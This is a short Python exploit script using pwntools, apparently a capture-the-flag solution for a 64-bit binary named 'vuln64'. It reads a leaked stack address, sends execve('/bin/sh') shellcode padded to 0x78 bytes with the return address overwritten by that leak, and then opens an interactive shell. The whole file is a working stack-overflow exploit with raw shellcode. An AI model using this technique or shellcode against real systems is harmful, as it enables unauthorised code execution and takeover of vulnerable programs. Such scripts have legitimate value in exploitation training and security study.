# Import pwn tools
from pwn import *

# Establish the target process, and attach gdb
target = process('vuln64')
#gdb.attach(target, gdbscript = 'b *0x400585')

# Get the address being leaked, strip the newline, and convert it to and integer
infoleak = target.recvline().replace("\x0a", "")
address = int(infoleak, 16) 

# Establish the shellcode:
'''
  400080:   48 bf 2f 62 69 6e 2f    movabs rdi,0x68732f6e69622f
  400087:   73 68 00 
  40008a:   57                      push   rdi
  40008b:   54                      push   rsp
  40008c:   5f                      pop    rdi
  40008d:   48 31 f6                xor    rsi,rsi
  400090:   48 31 d2                xor    rdx,rdx
  400093:   b8 3b 00 00 00          mov    eax,0x3b
  400098:   0f 05                   syscall 
'''
shellcode = "\x48\xbf\x2f\x62\x69\x6e\x2f\x73\x68\x00\x57\x54\x5f\x48\x31\xf6\x48\x31\xd2\xb8\x3b\x00\x00\x00\x0f\x05"

# Construct the payload
payload = shellcode + ((0x78 - len(shellcode))*"0") + p64(address)

# Send the payload
target.sendline(payload)

# Drop to an interactive shell
target.interactive()